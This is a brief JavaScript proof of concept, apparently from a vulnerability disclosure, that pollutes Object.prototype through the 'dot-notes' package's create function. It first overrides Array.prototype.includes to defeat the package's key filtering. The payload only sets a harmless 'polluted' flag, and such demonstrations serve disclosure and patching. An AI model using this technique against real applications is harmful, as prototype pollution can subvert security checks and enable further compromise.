Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const dots = require('dot-notes');
dots.create({}, '__proto__.polluted', 'yes');
console.log({}.polluted);